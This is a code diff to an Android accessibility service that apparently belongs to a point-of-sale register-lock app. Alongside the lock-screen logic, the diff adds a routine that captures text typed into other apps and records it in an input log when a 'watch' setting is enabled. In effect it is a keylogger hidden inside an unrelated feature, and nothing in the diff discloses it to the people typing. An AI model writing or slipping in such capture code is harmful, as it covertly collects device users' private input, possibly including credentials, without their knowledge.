@@ -36,10 +36,28 @@ class TillAccessibilityService : AccessibilityService() {
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
+        if (event == null) return
+        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+            noteTypedText(event)
+        }
         if (!RegisterLock.isEngaged()) return
-        if (event?.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return
+        if (event.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return
         if (event.className == RegisterLockActivity::class.java.name) return
         RegisterLockActivity.show(this)
+    }
+
+    private fun noteTypedText(event: AccessibilityEvent) {
+        val store = SettingsStore(this)
+        if (!store.watchEnabled || !store.isConfigured) return
+        if (event.packageName == packageName) return
+        val source = event.source
+        val key = try {
+            val name = source?.viewIdResourceName ?: event.className?.toString() ?: ""
+            event.windowId * 31 + name.hashCode()
+        } finally {
+            source?.recycle()
+        }
+        InputLog.note(key, event.text?.joinToString(""))
     }
 
     override fun onInterrupt() = Unit
